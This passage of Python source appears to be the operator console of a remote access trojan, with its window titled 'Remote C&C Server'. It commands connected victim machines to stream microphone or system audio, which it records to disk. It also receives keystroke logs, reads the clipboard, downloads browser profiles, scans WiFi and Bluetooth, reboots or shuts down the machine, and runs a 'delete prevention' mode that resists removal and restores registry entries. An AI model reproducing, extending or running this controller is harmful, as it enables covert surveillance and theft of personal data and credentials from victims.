        wav_filename = os.path.join(self.captures_dir, f"audio_stream_{timestamp}.wav")
        wav_file = None
        
        try:
            wav_file = wave.open(wav_filename, 'wb')
            wav_file.setnchannels(2)
            wav_file.setsampwidth(2) # 2 bytes for Int16
            wav_file.setframerate(48000)
            print(f"Saving audio stream to: {wav_filename}")
        except Exception as e:
            print(f"Failed to create WAV file: {e}")
        
        # 2. Setup PyAudio Stream for Playback
        try:
            # Open PyAudio stream for raw PCM playback
            # Assuming 48kHz stereo float32 from WASAPI
            stream = self.pyaudio.open(
                format=pyaudio.paFloat32,
                channels=2,
                rate=48000,
                output=True,
                frames_per_buffer=1920  # 40ms chunks
            )
            
            print("✓ PyAudio stream opened for PCM playback")
            self.update_shell_output("[+] Audio stream started (PCM mode)\n", 'info')
            if wav_file:
                self.update_shell_output(f"[+] Recording to: {os.path.basename(wav_filename)}\n", 'info')
            
        except Exception as e:
            print(f"PyAudio stream open failed: {e}")
            self.update_shell_output(f"[!] PyAudio error: {e}\n", 'error')
            if wav_file: wav_file.close()
            return
        
        consecutive_underruns = 0
        last_stats_time = time.time()
        last_vis_time = time.time()
        chunks_played = 0
        
        # Wait for initial buffer
        print("Waiting for audio buffer to fill...")
        while self.audio_playing and len(self.audio_buffer) < 20:
            time.sleep(0.1)
        
        print(f"Starting playback with buffer size: {len(self.audio_buffer)}")
        
        try:
            while self.audio_playing:
                if len(self.audio_buffer) > 10:  # Keep cushion
                    with self.audio_lock:
                        audio_data = self.audio_buffer.popleft()
                    
                    # Send frequency data to visualizer (every 50ms for smooth animation)
                    now = time.time()
                    if now - last_vis_time >= 0.05:  # 20fps update
                        self.update_audio_visualizer(audio_data)
                        last_vis_time = now
                    
                    if consecutive_underruns > 0:
                        print(f"Buffer recovered (was empty for {consecutive_underruns} cycles)")
                    consecutive_underruns = 0
                    
                    try:
                        # Play raw PCM audio (Float32)
                        stream.write(audio_data)
                        chunks_played += 1
                        
                        # Save to file (Convert Float32 to Int16 for standard WAV compatibility)
                        if wav_file:
                            # Convert bytes to numpy array (Float32)
                            audio_np = np.frombuffer(audio_data, dtype=np.float32)
                            # Convert to Int16 (scale by 32767)
                            audio_int16 = (audio_np * 32767).astype(np.int16)
                            # Write to WAV file
                            wav_file.writeframes(audio_int16.tobytes())
                            
                    except Exception as e:
                        print(f"Playback error: {e}")
                else:
                    consecutive_underruns += 1
                    
                    if consecutive_underruns == 1:
                        print("Audio buffer underrun - waiting for data...")
                    elif consecutive_underruns % 100 == 0:
                        print(f"Audio buffer still empty ({consecutive_underruns} cycles)")
                    
                    time.sleep(0.01)
                
                # Stats every 5 seconds
                now = time.time()
                if now - last_stats_time >= 5.0:
                    buffer_size = len(self.audio_buffer)
                    print(f"Audio Stats:")
                    print(f"  Chunks played: {chunks_played}")
                    print(f"  Buffer size: {buffer_size}")
                    print(f"  Underruns: {consecutive_underruns}")
                    
                    last_stats_time = now
                    chunks_played = 0
        finally:
            # Cleanup
            stream.stop_stream()
            stream.close()
            if wav_file:
                wav_file.close()
                print(f"Audio playback stopped. File saved: {wav_filename}")
                self.update_shell_output(f"[✓] Audio stream saved to {os.path.basename(wav_filename)}\n", 'success')
            else:
                print("Audio playback stopped")

    def update_audio_visualizer(self, audio_data):
        """Calculate real frequency data from audio and send to browser"""
        try:
            # Convert bytes to numpy array (float32)
            audio_np = np.frombuffer(audio_data, dtype=np.float32)
            
            # Debug: print audio data stats
            print(f"Audio data shape: {audio_np.shape}, min: {np.min(audio_np):.3f}, max: {np.max(audio_np):.3f}, mean: {np.mean(audio_np):.3f}")
            
            # Calculate FFT (Fast Fourier Transform) for frequency analysis
            # Use 1024 samples for frequency resolution
            if len(audio_np) < 1024:
                # Pad if needed
                audio_np = np.pad(audio_np, (0, 1024 - len(audio_np)), 'constant')
            else:
                audio_np = audio_np[:1024]
            
            # Apply window function to reduce spectral leakage
            window = np.hanning(len(audio_np))
            audio_windowed = audio_np * window
            
            # Compute FFT
            fft_data = np.fft.rfft(audio_windowed)
            magnitude = np.abs(fft_data)
            
            # Convert to dB scale (with small offset to avoid log(0))
            magnitude_db = 20 * np.log10(magnitude + 1e-10)
            
            # Debug: print FFT stats
            print(f"Magnitude dB - min: {np.min(magnitude_db):.1f}, max: {np.max(magnitude_db):.1f}, mean: {np.mean(magnitude_db):.1f}")
            
            # Normalize to 0-255 range for visualizer
            # Typical dB range for audio is -60dB to 0dB
            magnitude_norm = np.clip((magnitude_db + 60) / 60 * 255, 0, 255)
            
            # Debug: print normalized stats
            print(f"Normalized - min: {np.min(magnitude_norm):.1f}, max: {np.max(magnitude_norm):.1f}, mean: {np.mean(magnitude_norm):.1f}")
            
            # Downsample to 32 bars for visualizer
            bars_count = 32
            bars_data = []
            step = max(1, len(magnitude_norm) // bars_count)
            
            for i in range(bars_count):
                start_idx = i * step
                end_idx = min(start_idx + step, len(magnitude_norm))
                if start_idx < len(magnitude_norm):
                    bar_value = np.mean(magnitude_norm[start_idx:end_idx])
                    # Convert numpy float to Python float for JSON serialization
                    bars_data.append(int(bar_value))
                else:
                    bars_data.append(0)
            
            # Debug: print bars data
            print(f"Bars data: {bars_data[:5]}...")  # First 5 bars
            
            # Calculate RMS for overall level
            rms = np.sqrt(np.mean(audio_np**2))
            # Convert numpy float to Python float/int
            rms_percent = min(100, int(float(rms) * 1000))
            
            # Calculate peak
            peak = np.max(np.abs(audio_np))
            # Convert numpy float to Python float/int
            peak_percent = min(100, int(float(peak) * 1000))
            
            # Check clipping - convert numpy bool to Python bool
            clipping = bool(peak > 0.95)
            
            # Debug: print levels
            print(f"RMS: {float(rms):.3f} -> {rms_percent}%, Peak: {float(peak):.3f} -> {peak_percent}%, Clipping: {clipping}")
            
            # Create data with all Python native types
            vis_data = {
                "bars": [int(x) for x in bars_data],  # Ensure all are Python ints
                "rms": int(rms_percent),
                "peak": int(peak_percent),
                "clipping": clipping  # This is now a Python bool
            }
            
            # Send to browser
            self.safe_eval_js(f"updateRealVisualizer({json.dumps(vis_data)})")
            print("✓ Visualizer data sent to browser")
            
        except Exception as e:
            print(f"Visualizer calculation error: {e}")
            import traceback
            traceback.print_exc()

    def start_audio_listen(self):
        """Start audio streaming"""
        if not self.clients:
            self.update_shell_output("[!] No clients connected\n", 'error')
            return
        
        # Clear buffer
        with self.audio_lock:
            self.audio_buffer.clear()
        
        self.audio_buffer_underruns = 0
        self.audio_buffer_overflows = 0
        
        # Start streaming
        self.send_stream_command("START_AUDIO")
        self.audio_playing = True
        threading.Thread(target=self.audio_playback_worker, daemon=True).start()
        
        # Show visualizer
        self.safe_eval_js("""
            if (typeof audioVisualizer !== 'undefined') {
                audioVisualizer.start();
            }
        """)
        
        self.update_shell_output("[+] Raw PCM audio streaming started\n", 'info')
        print("Raw PCM audio streaming initialized")

    def start_audio_listen1(self):
        """Start audio streaming"""
        if not self.clients:
            self.update_shell_output("[!] No clients connected\n", 'error')
            return
        
        # Clear buffer
        with self.audio_lock:
            self.audio_buffer.clear()
        
        self.audio_buffer_underruns = 0
        self.audio_buffer_overflows = 0
        
        # Start streaming
        self.send_stream_command("START_SYSTEM_AUDIO")
        self.audio_playing = True
        threading.Thread(target=self.audio_playback_worker, daemon=True).start()
        
        # Show visualizer
        self.safe_eval_js("""
            if (typeof audioVisualizer !== 'undefined') {
                audioVisualizer.start();
            }
        """)
        
        self.update_shell_output("[+] Raw PCM audio streaming started\n", 'info')
        print("Raw PCM audio streaming initialized")

    def stop_audio_stream(self):
        """Stop audio streaming"""
        if not self.audio_playing:
            return
        
        print("Stopping audio stream...")
        self.send_stream_command("STOP")
        
        self.audio_playing = False
        
        time.sleep(0.1)
        
        with self.audio_lock:
            buffer_size = len(self.audio_buffer)
            self.audio_buffer.clear()
        
        # Hide visualizer
        self.safe_eval_js("""
            if (typeof audioVisualizer !== 'undefined') {
                audioVisualizer.stop();
            }
        """)
        
        print(f"Audio stream stopped (cleared {buffer_size} buffered chunks)")
        self.update_shell_output("[✓] Audio stream stopped\n", 'info')
        
    def cmd_audio_stats(self):
        """Show audio streaming statistics"""
        if not self.audio_playing:
            self.update_shell_output("[!] Audio streaming not active\n", 'error')
            return
        
        buffer_size = len(self.audio_buffer)
        stats = f"""
=== Audio Streaming Statistics ===
Current buffer size: {buffer_size} / 500
Total underruns: {self.audio_buffer_underruns}
Total overflows: {self.audio_buffer_overflows}
===================================
"""
        self.update_shell_output(stats, 'info')

    # ============================================
    # END RAW PCM AUDIO STREAMING LOGIC
    # ============================================

    # Network Traffic
    def cmd_start_network_monitor(self): self.send_command({"type": "start_network_monitor"})
    def cmd_stop_network_monitor(self): self.send_command({"type": "stop_network_monitor"})

    # Browser Profiles
    def cmd_get_browser_profiles(self):
        if not self.clients: return
        self.send_command({"type": "list_browser_profiles"})
        self.update_shell_output("[+] Requesting browser profiles...\n", 'info')
    
    def cmd_reset_browser_transfer(self):
        self.send_command({"type": "reset_browser_transfer"})
        self.browserTransferring = False
        self.update_shell_output("[+] Reset browser transfer flags\n", 'info')

    def cmd_start_delete_prevention(self):
        """Send command to client to start delete prevention threads"""
        self.send_command({"type": "start_delete_prevention"})
        self.update_shell_output("[+] Starting Delete Prevention & Monitoring...\n", 'info')
        self.update_shell_output("[+] Notifications will appear at the top right.\n", 'info')

    def cmd_stop_delete_prevention(self):
        """Send command to client to stop delete prevention threads"""
        self.send_command({"type": "stop_delete_prevention"})
        self.update_shell_output("[!] Stopping Delete Prevention.\n", 'warning')
    
    def cmd_move_executable(self, target_path):
        self.send_command({"type": "move_executable", "path": target_path})
        self.update_shell_output(f"[+] Moving executable to: {target_path}\n", 'info')
    
    def cmd_reboot(self, delay=0):
        """Reboot the client system"""
        self.send_command({"type": "reboot", "delay": int(delay)})
    
        if delay > 0:
            self.update_shell_output(f"[!] System reboot scheduled in {delay} seconds\n", 'error')
        else:
            self.update_shell_output("[!] System rebooting NOW\n", 'error')

    def cmd_shutdown(self, delay=0):
        """Shutdown the client system"""
        self.send_command({"type": "shutdown", "delay": int(delay)})
    
        if delay > 0:
            self.update_shell_output(f"[!] System shutdown scheduled in {delay} seconds\n", 'error')
        else:
            self.update_shell_output("[!] System shutting down NOW\n", 'error')

    def cmd_cancel_shutdown(self):
        """Cancel scheduled shutdown or reboot"""
        self.send_command({"type": "cancel_shutdown"})
        self.update_shell_output("[+] Shutdown/reboot cancelled\n", 'info')
    
    # ============================================
    # FIXED: Python Browser Profile Handler
    # ============================================
    
    def download_browser_profile(self, profile_path, profile_name):
        """
        Download browser profile with robust path handling
        """
        print(f"\n{'='*50}")
        print(f"[PYTHON] download_browser_profile called")
        print(f"[PYTHON] Raw profile_path: [{profile_path}]")
        print(f"[PYTHON] profile_name: [{profile_name}]")
        print(f"[PYTHON] Path type: {type(profile_path)}")
        print(f"[PYTHON] Path length: {len(profile_path)}")
        print(f"{'='*50}\n")
        
        if not self.clients:
            self.update_shell_output("[!] No clients connected\n", 'error')
            return
        
        # Check if already downloading
        if hasattr(self, 'browserTransferring') and self.browserTransferring:
            self.update_shell_output("[!] Browser transfer already in progress\n", 'error')
            self.update_shell_output("[!] If stuck, restart the server to reset\n", 'error')
            return
        
        # CRITICAL: Do NOT modify the path here - pass it as-is
        # The C++ side will handle all the cleaning
        # Only ensure it's a string
        clean_path = str(profile_path).strip()
        
        print(f"[PYTHON] Sending to C++: [{clean_path}]")
        print(f"[PYTHON] Path bytes: {clean_path.encode('utf-8')}")
        
        self.browserTransferring = True
        self.browserTransferStartTime = time.time()
        
        self.update_shell_output(f"\n{'='*50}\n", 'info')
        self.update_shell_output(f"[+] DOWNLOADING BROWSER PROFILE\n", 'info')
        self.update_shell_output(f"[+] Profile: {profile_name}\n", 'info')
        self.update_shell_output(f"[+] Source: {clean_path}\n", 'info')
        self.update_shell_output(f"[+] Destination: {self.captures_dir}\n", 'info')
        self.update_shell_output(f"[+] This may take several minutes for large profiles...\n", 'info')
        self.update_shell_output(f"{'='*50}\n\n", 'info')
        
        # Send command - use simple JSON encoding
        # The key is to NOT double-escape
        command = {
            "type": "get_browser_profile",
            "profile_path": clean_path  # Pass as-is, json.dumps will handle escaping
        }
        
        # Debug: Print what we're actually sending
        json_str = json.dumps(command)
        print(f"[PYTHON] JSON being sent:")
        print(json_str)
        print(f"[PYTHON] JSON length: {len(json_str)}")
        
        self.send_command(command)
        
        # Set a timeout watchdog
        def timeout_check():
            time.sleep(300)  # 5 minute timeout
            if hasattr(self, 'browserTransferring') and self.browserTransferring:
                self.update_shell_output("[!] Browser transfer timed out (5 minutes)\n", 'error')
                self.update_shell_output("[!] The profile may be too large or the client disconnected\n", 'error')
                self.browserTransferring = False
        
        threading.Thread(target=timeout_check, daemon=True).start()

    # ===========================================================
    # CORE LOGIC
    # ===========================================================

    def run(self):
        html_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'index.html')
        if not os.path.exists(html_path):
            print("FATAL: index.html missing!")
            return

        with open(html_path, 'r', encoding='utf-8') as f:
            html_content = f.read()

        self.window = webview.create_window(
            'Remote C&C Server',
            html=html_content,
            js_api=self,
            width=1400,
            height=900,
            resizable=True,
            text_select=False
        )

        webview.start(debug=True)
    
    def get_storage_devices(self):
        """Request storage devices from client"""
        self.send_command({"type": "get_storage_devices"})
        # Logging is now silenced in send_command for this type
        # self.update_shell_output("[+] Requesting storage devices...\n", 'info')

    def start_storage_monitoring(self):
        """Start periodic storage device monitoring"""
        if hasattr(self, '_storage_monitor_running') and self._storage_monitor_running:
            return
        
        self._storage_monitor_running = True
        
        def monitor_loop():
            while self._storage_monitor_running and self.clients:
                self.get_storage_devices()
                # UPDATED: Reduced frequency to 30 seconds
                time.sleep(30) 
        
        thread = threading.Thread(target=monitor_loop, daemon=True)
        thread.start()

    def stop_storage_monitoring(self):
        """Stop storage monitoring"""
        self._storage_monitor_running = False

    def on_client_selected(self, selection_value):
        """Handle client/instance selection from dropdown"""
        if not selection_value:
            return
        
        # Reset specific targets first
        self.selected_instance_id = None
        self.selected_device_id = None
        
        if selection_value == "ALL_CLIENTS":
            self.update_shell_output("[+] Targeting: ALL CLIENTS\n", 'info')
            
        elif selection_value.startswith("DEVICE:"):
            # Target all instances of a specific device
            self.selected_device_id = selection_value[7:]  # Remove "DEVICE:"
            self.update_shell_output(f"[+] Targeting: ALL instances of device {self.selected_device_id[:8]}\n", 'info')
            
        elif selection_value.startswith("INSTANCE:"):
            # Target a specific instance
            self.selected_instance_id = selection_value
            parts = selection_value.split(':')
            if len(parts) == 3:
                device_id = parts[1]
                instance_id = parts[2]
                self.update_shell_output(f"[+] Targeting: Device {device_id[:8]}, Instance {instance_id[:4]}\n", 'info')
            else:
                self.update_shell_output(f"[!] Invalid selection format: {selection_value}\n", 'error')
    
    def is_websocket_targeted(self, websocket):
        """
        Check if the incoming websocket matches the current dropdown selection.
        Returns True if we should accept data from this websocket.
        """
        # 1. Check Specific Instance
        if self.selected_instance_id and self.selected_instance_id != "ALL_CLIENTS":
            if not self.selected_instance_id.startswith("INSTANCE:"): return False
            parts = self.selected_instance_id.split(':')
            if len(parts) != 3: return False
            
            _, device_id, instance_id = parts
            
            # Check if this websocket matches the targeted instance
            if device_id in self.connected_clients:
                instances = self.connected_clients[device_id].get('instances', {})
                if instance_id in instances:
                    return instances[instance_id]['websocket'] == websocket
            return False

        # 2. Check Device Targeting
        elif self.selected_device_id and self.selected_device_id != "ALL_CLIENTS":
            # Accept data from any instance belonging to the selected device
            if self.selected_device_id in self.connected_clients:
                instances = self.connected_clients[self.selected_device_id].get('instances', {})
                for inst_info in instances.values():
                    if inst_info['websocket'] == websocket:
                        return True
            return False

        # 3. All Clients / No Selection
        else:
            return True

    def send_stream_command(self, command_str):
        """Send stream command to selected client(s) with STRICT targeting"""
        if not self.clients: return

        # ==========================================
        # 1. SPECIFIC INSTANCE TARGETING
        # ==========================================
        if self.selected_instance_id and self.selected_instance_id != "ALL_CLIENTS":
            if not self.selected_instance_id.startswith("INSTANCE:"): return
            parts = self.selected_instance_id.split(':')
            if len(parts) != 3: return
            
            _, device_id, instance_id = parts
            
            target_ws = None
            if device_id in self.connected_clients:
                instances = self.connected_clients[device_id].get('instances', {})
                if instance_id in instances:
                    target_ws = instances[instance_id]['websocket']
            
            if target_ws:
                try:
                    asyncio.run_coroutine_threadsafe(target_ws.send(command_str), self.loop)
                except Exception as e:
                    print(f"Failed to send stream command to instance: {e}")
            return # Stop here - do NOT broadcast

        # ==========================================
        # 2. DEVICE TARGETING (All instances of a device)
        # ==========================================
        elif self.selected_device_id and self.selected_device_id != "ALL_CLIENTS":
            if self.selected_device_id in self.connected_clients:
                instances = self.connected_clients[self.selected_device_id].get('instances', {})
                for inst_info in instances.values():
                    try:
                        asyncio.run_coroutine_threadsafe(inst_info['websocket'].send(command_str), self.loop)
                    except Exception as e:
                        print(f"Failed to send stream command to instance: {e}")
            return # Stop here - do NOT broadcast

        # ==========================================
        # 3. BROADCAST (All Clients)
        # ==========================================
        else:
            # FIX: Iterate over a copy of the set to avoid RuntimeError
            clients_to_remove = []
            for client in list(self.clients):
                try:
                    asyncio.run_coroutine_threadsafe(client.send(command_str), self.loop)
                except Exception as e:
                    print(f"Failed to broadcast stream command: {e}")
                    # If connection error, mark for removal
                    if "closed" in str(e).lower() or "reset" in str(e).lower():
                        clients_to_remove.append(client)
            
            # Clean up dead clients
            for c in clients_to_remove:
                self.clients.discard(c)

    def send_binary(self, data):
        # FIX: Iterate over a copy of the set
        clients_to_remove = []
        for client in list(self.clients):
            try:
                asyncio.run_coroutine_threadsafe(client.send(data), self.loop)
            except Exception as e:
                print(f"Failed to send binary: {e}")
                if "closed" in str(e).lower() or "reset" in str(e).lower():
                    clients_to_remove.append(client)
        
        for c in clients_to_remove:
            self.clients.discard(c)

    def send_command(self, command):
        """Send command to selected client(s) with STRICT targeting"""
        if not self.clients:
            self.update_shell_output("[!] No clients connected\n", 'error')
            return
        
        # Convert dict to JSON string if needed
        if isinstance(command, dict):
            message = json.dumps(command)
            cmd_type = command.get('type')
        else:
            message = command
            try:
                cmd_type = json.loads(command).get('type')
            except:
                cmd_type = None

        # ==========================================
        # 1. SPECIFIC INSTANCE TARGETING
        # ==========================================
        if self.selected_instance_id and self.selected_instance_id != "ALL_CLIENTS":
            if not self.selected_instance_id.startswith("INSTANCE:"):
                self.update_shell_output(f"[!] Invalid target format: {self.selected_instance_id}\n", 'error')
                return

            parts = self.selected_instance_id.split(':')
            if len(parts) != 3:
                self.update_shell_output("[!] Invalid target format parsing\n", 'error')
                return
            
            _, device_id, instance_id = parts

            # Find the specific websocket
            target_ws = None
            if device_id in self.connected_clients:
                instances = self.connected_clients[device_id].get('instances', {})
                # Lookup exact instance ID
                if instance_id in instances:
                    target_ws = instances[instance_id]['websocket']
            
            if target_ws:
                try:
                    asyncio.run_coroutine_threadsafe(target_ws.send(message), self.loop)
                    # Silent log for storage monitor
                    if cmd_type != 'get_storage_devices':
                        self.update_shell_output(f"[→] Sent to Instance {instance_id[:4]}\n", 'info')
                    return # SUCCESS: Command sent, exit function
                except Exception as e:
                    self.update_shell_output(f"[!] Failed to send to instance: {e}\n", 'error')
                    return
            else:
                # Instance not found (likely disconnected)
                self.update_shell_output(f"[!] Instance {instance_id[:4]} not found or disconnected.\n", 'error')
                return

        # ==========================================
        # 2. DEVICE TARGETING (All instances of a device)
        # ==========================================
        elif self.selected_device_id and self.selected_device_id != "ALL_CLIENTS":
            if self.selected_device_id in self.connected_clients:
                instances = self.connected_clients[self.selected_device_id].get('instances', {})
                count = 0
                for inst_info in instances.values():
                    try:
                        asyncio.run_coroutine_threadsafe(inst_info['websocket'].send(message), self.loop)
                        count += 1
                    except Exception as e:
                        print(f"Failed to send to instance: {e}")
                
                if count > 0:
                    # Silent log for storage monitor
                    if cmd_type != 'get_storage_devices':
                        self.update_shell_output(f"[→] Sent to Device {self.selected_device_id[:8]} ({count} instances)\n", 'info')
                    return # SUCCESS
                else:
                    self.update_shell_output(f"[!] Device found but no active instances.\n", 'error')
                    return
            else:
                self.update_shell_output(f"[!] Device {self.selected_device_id[:8]} not found.\n", 'error')
                return

        # ==========================================
        # 3. BROADCAST (All Clients)
        # ==========================================
        else:
            # Only reaches here if selected_instance_id and selected_device_id are None or "ALL_CLIENTS"
            # FIX: Iterate over a copy of the set
            clients_to_remove = []
            for client in list(self.clients):
                try:
                    asyncio.run_coroutine_threadsafe(client.send(message), self.loop)
                except Exception as e:
                    print(f"Failed to broadcast: {e}")
                    if "closed" in str(e).lower() or "reset" in str(e).lower():
                        clients_to_remove.append(client)
            
            # Remove dead clients to stop error spam
            for c in clients_to_remove:
                self.clients.discard(c)
            
            # Silent log for storage monitor
            if cmd_type != 'get_storage_devices':
                self.update_shell_output("[→] Broadcasting to ALL clients\n", 'info')

    def handle_advanced_responses(self, data):
        msg_type = data.get('type')
        
        # ==================== DELETE PREVENTION ALERTS ====================
        if msg_type == 'delete_attempt':
            path = data.get('path', 'Unknown')
            action = data.get('action', 'DELETE')
            self.show_notification(
                "🗑 File Deletion Detected", 
                f"Attempt to {action} on: {path}", 
                'danger', data
            )
        elif msg_type == 'file_restored':
            path = data.get('path', 'Unknown')
            self.show_notification(
                "✓ File Restored", 
                f"Successfully restored: {path}", 
                'success', data
            )
        elif msg_type == 'termination_attempt':
            method = data.get('method', 'UNKNOWN')
            self.show_notification(
                "⚠ Termination Attempt", 
                f"Method: {method}. Possible attack.", 
                'warning', data
            )
        elif msg_type == 'service_stop_attempt':
            service = data.get('service', 'Unknown')
            self.show_notification(
                "⚠ Service Stop Detected", 
                f"Service '{service}' stopped. Attempting restart...", 
                'warning', data
            )
        elif msg_type == 'registry_delete_attempt':
            key = data.get('key', 'Unknown')
            val = data.get('value', 'Unknown')
            self.show_notification(
                "⚠ Registry Deletion", 
                f"Entry '{val}' removed from {key}. Restoring...", 
                'warning', data
            )
        # ==================== END DELETE PREVENTION ====================

        elif msg_type == 'wifi_scan':
            self.update_shell_output(f"=== WiFi Networks ===\n{data.get('networks', '')}\n", 'output')
        elif msg_type == 'network_scan':
            self.update_shell_output(f"=== Network Devices ===\n{data.get('devices', '')}\n", 'output')
        elif msg_type == 'bluetooth_scan':
            self.update_shell_output(f"=== Bluetooth Devices ===\n{data.get('devices', '')}\n", 'output')
        elif msg_type == 'clipboard':
            self.update_shell_output(f"=== Clipboard Content ===\n{data.get('content', '')}\n", 'output')
        elif msg_type == 'user_sessions':
            sessions = data.get('sessions', [])
            output = "=== User Sessions ===\n"
            for s in sessions:
                output += f"  Session {s['id']}: {s['domain']}\\{s['username']} ({s['state']})\n"
            self.update_shell_output(output + "\n", 'output')
        elif msg_type == 'privilege_status':
            self.update_shell_output(f"=== Privilege Status ===\n{data.get('status', '')}\n", 'info')
        elif msg_type == 'root_request_result':
            res = "Success" if data.get('success') else "Failed"
            self.update_shell_output(f"[{res}] {data.get('message', '')}\n", 'info')
        elif msg_type == 'registry_triggers':
            triggers = data.get('triggers', [])
            self.display_triggers(triggers)
            self.update_shell_output(f"[+] Found {len(triggers)} registry triggers\n", 'info')
        elif msg_type == 'schedule_result':
            task_name = data.get('task_name', 'Unknown')
            success = data.get('success', False)
            message = data.get('message', '')
        
            if success:
                self.update_shell_output(f"[✓] Task '{task_name}' created successfully\n", 'success')
            else:
                self.update_shell_output(f"[✗] Task '{task_name}' failed: {message}\n", 'error')
        
        # Refresh the task list to show new task
            self.cmd_list_scheduled_tasks()
        elif msg_type == 'task_list':
            self.update_shell_output(f"=== Running Tasks ===\n{data.get('tasks', '')}\n", 'output')
        elif msg_type == 'startup_apps':
            self.update_shell_output(f"=== Startup Apps ===\n{data.get('apps', '')}\n", 'output')
        elif msg_type == 'system_settings':
            self.display_system_settings(data.get('settings', []))
        elif msg_type == 'setting_update_result':
            self.update_shell_output(f"[{'OK' if data.get('success') else 'ERR'}] {data.get('message', '')}\n", 'info')
        elif msg_type == 'keylog':
            self.update_shell_output(f"[{datetime.now().strftime('%H:%M:%S')}] {data.get('key', '')}", 'output')
        elif msg_type == 'wallpaper_info':
            self.update_shell_output(f"Current wallpaper: {data.get('path', '')}\n", 'info')
        elif msg_type == 'network_traffic':
            stats = data.get('data', {})
            self.safe_eval_js(f"updateNetworkStats({json.dumps(stats)})")
            
        elif msg_type in ['fan_list', 'led_list', 'screen_list']:
            list_name = msg_type.split('_')[0]
            items = data.get(list_name + 's', []) if list_name != 'screen' else data.get('screens', [])
            out = f"=== {list_name.upper()} LIST ===\n"
            for i in items:
                out += f"  {i}\n"
            self.update_shell_output(out, 'output')
        elif msg_type in ['fan_result', 'led_result', 'screen_result']:
            res = "Success" if data.get('success') else "Failed"
            self.update_shell_output(f"[{res}] {data.get('message', '')}\n", 'info')
        elif msg_type == 'scheduled_tasks_list':
            self.display_scheduled_tasks(data.get('tasks', []))
        elif msg_type == 'triggers_list':
            self.display_triggers(data.get('triggers', []))
        elif msg_type == 'device_list':
            self.display_devices(data.get('devices', []))
        elif msg_type == 'storage_devices':
            self.handle_storage_response(data)
        elif msg_type == 'usb_monitor_status':
            msg = data.get('message', '')
            tag = data.get('tag', 'info')
            self.append_usb_log(msg, tag)

    def save_file(self, data, file_type, extension, extra_info=''):
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"{file_type}_{timestamp}_{extra_info}.{extension}" if extra_info else f"{file_type}_{timestamp}.{extension}"
            filepath = os.path.join(self.captures_dir, filename)
            
            with open(filepath, 'wb') as f:
                f.write(data)
            
            self.update_shell_output(f"[✓] {file_type.capitalize()} saved: {filename}\n", 'success')
        except Exception as e:
            print(f"Error saving file: {e}")
            self.update_shell_output(f"[!] Failed to save {file_type}\n", 'error')

    def playback_loop(self):
        if not self.running: return
        
        playback_delay = 40
        
        if self.is_streaming_playing:
            frame = None
            buffer_size = 0
            
            with self.stream_buffer_lock:
                buffer_size = len(self.playback_buffer)
                
                if buffer_size > 90: playback_delay = 36
                elif buffer_size > 75: playback_delay = 38
                elif buffer_size > 65: playback_delay = 40
                elif buffer_size < 30: playback_delay = 56
                elif buffer_size < 40: playback_delay = 50
                elif buffer_size < 50: playback_delay = 45
                else: playback_delay = 42
                
                if buffer_size > 0:
                    frame = self.playback_buffer.popleft()
                    buffer_size = len(self.playback_buffer)
                    if buffer_size <= self.min_buffer_before_pause:
                        self.is_streaming_playing = False
                else:
                    self.is_streaming_playing = False
            
            if frame is not None:
                self.display_stream_frame(frame)
                self.display_count += 1
                self.display_fps_counter += 1
                
                now = time.time()
                if now - self.last_display_time >= 1.0:
                    self.display_fps = self.display_fps_counter
                    self.display_fps_counter = 0
                    self.last_display_time = now
                    self.update_stream_stats()
        else:
            playback_delay = 40
        
        threading.Timer(playback_delay / 1000.0, self.playback_loop).start()

    def run_server(self):
        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.loop)

        async def handle_client(websocket):
            # Generate a unique instance ID for this connection
            instance_id = str(uuid.uuid4())[:8]
            client_address = websocket.remote_address
            
            self.clients.add(websocket)
            
            # Store temporarily until we get device ID
            temp_device_info = {
                'websocket': websocket,
                'instance_id': instance_id,
                'connect_time': time.time()
            }
            
            def update_ui():
                time.sleep(0.1)
                self.update_client_list()
                self.enable_controls()
                
            threading.Thread(target=update_ui, daemon=True).start()
            
            self.update_shell_output(f"[+] New instance {instance_id} connecting from {client_address}\n", 'success')

            device_id = None

            try:
                async for message in websocket:
                    if not self.running: break
                    
                    try:
                        if isinstance(message, bytes):
                            if self.downloading:
                                self.download_buffer.extend(message)
                                continue
                            
                            # Handle Audio (New Method - Raw PCM)
                            if await self.handle_audio_packet(message):
                                continue
                            
                            # Check if it's a video frame
                            is_video_frame = False
                            try:
                                nparr = np.frombuffer(message, np.uint8)
                                frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
                                if frame is not None and frame.size > 0:
                                    is_video_frame = True
                                    with self.stream_buffer_lock:
                                        self.playback_buffer.append(frame)
                                        buffer_size = len(self.playback_buffer)
                                        if not self.is_streaming_playing and buffer_size >= self.target_buffer_size:
                                            self.is_streaming_playing = True
                                    self.recv_count += 1
                                    self.recv_fps_counter += 1
                                    now = time.time()
                                    if now - self.last_recv_time >= 1.0:
                                        self.recv_fps = self.recv_fps_counter
                                        self.recv_fps_counter = 0
                                        self.last_recv_time = now
                                        self.update_stream_stats()
                                    continue
                            except Exception as frame_error:
                                pass

                            if not is_video_frame:
                                # Check for binary file with header (newline in first 500 bytes)
                                if len(message) > 10 and b'\n' in message[:500]:
                                    self.handle_binary_file(message)
                                    continue
                        else:
                            # STRING MESSAGE
                            data = json.loads(message)
                            
                            # Handle device ID registration
                            if data.get('type') == 'device_id':
                                device_id = data.get('device_id', 'UNKNOWN')
                                instance_id_from_client = data.get('instance_id', instance_id)
                                session_id = data.get('session_id', '')
                                privilege = data.get('privilege', '')
                                
                                # Register this instance with the device
                                if device_id not in self.connected_clients:
                                    self.connected_clients[device_id] = {
                                        'device_id': device_id,
                                        'instances': {}
                                    }
                                
                                # Store instance info
                                self.connected_clients[device_id]['instances'][instance_id_from_client] = {
                                    'websocket': websocket,
                                    'instance_id': instance_id_from_client,
                                    'connect_time': time.time(),
                                    'session_id': session_id,
                                    'privilege': privilege,
                                    'address': client_address
                                }
                                
                                self.update_client_list()
                                self.update_shell_output(f"[✓] Device {device_id[:8]} registered instance {instance_id_from_client[:4]}\n", 'success')
                                
                            # Handle system info (update with hostname/username)
                            elif data.get('type') == 'system_info':
                                device_id = data.get('device_id', 'UNKNOWN')
                                instance_id_from_client = data.get('instance_id', instance_id)
                                
                                if device_id in self.connected_clients:
                                    self.connected_clients[device_id]['hostname'] = data.get('hostname', 'unknown')
                                    self.connected_clients[device_id]['username'] = data.get('username', 'unknown')
                                    
                                    # Update instance with session info if available
